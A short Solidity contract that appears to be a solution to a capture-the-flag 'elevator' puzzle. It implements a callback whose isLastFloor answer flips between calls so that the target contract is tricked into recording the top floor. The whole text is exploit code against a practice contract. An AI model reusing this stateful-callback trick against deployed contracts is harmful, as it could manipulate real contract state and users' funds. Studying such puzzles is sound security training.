pragma solidity ^0.6.0;

interface Top{
    function goTo(uint256 _floor) external;
    function isCompleted() external  ;
}
contract Attract{
    Top public top;
    uint256 a = 0;
    function isLastFloor(uint256 b) external returns(bool){
        if(b != a){
            a = b ;
            return false;
        }else{
            return true;
        }
    } 
    function attract(address addr) public{
        top = Top(addr);
        top.goTo(1);
        top.isCompleted();
    }
}